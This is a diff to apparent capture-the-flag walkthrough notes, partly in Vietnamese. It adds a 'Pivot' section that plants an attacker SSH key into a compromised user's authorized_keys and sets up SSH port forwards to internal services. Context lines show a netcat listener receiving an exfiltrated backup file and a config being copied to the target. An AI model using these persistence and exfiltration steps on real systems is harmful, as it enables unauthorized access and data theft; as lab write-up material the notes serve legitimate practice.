@@ -54,6 +54,20 @@ nc -lvnp 5555 > web_20250806_120723.zip.aes -> your machine
 `scp npbackup.conf marco@10.10.11.82:/tmp/npbackup.conf`
 
 
+# Pivot 
+```
+# Trên Kali: Tạo khóa
+ssh-keygen -t ed25519 -f ~/.ssh/ctf_key -N ""
+cat ~/.ssh/ctf_key.pub
+
+# Trên Shell mcp-dev: Bơm khóa vào authorized_keys
+mkdir -p /home/mcp-dev/.ssh
+chmod 700 /home/mcp-dev/.ssh
+echo "ssh-ed25519 AAAAC3...[YOUR_PUB_KEY]..." > /home/mcp-dev/.ssh/authorized_keys
+chmod 600 /home/mcp-dev/.ssh/authorized_keys
+
+ssh -i ~/.ssh/ctf_key -L 8888:127.0.0.1:8888 -L 5000:127.0.0.1:5000 mcp-dev@10.129.20.133
+```
 # Beautify CLi
 
 
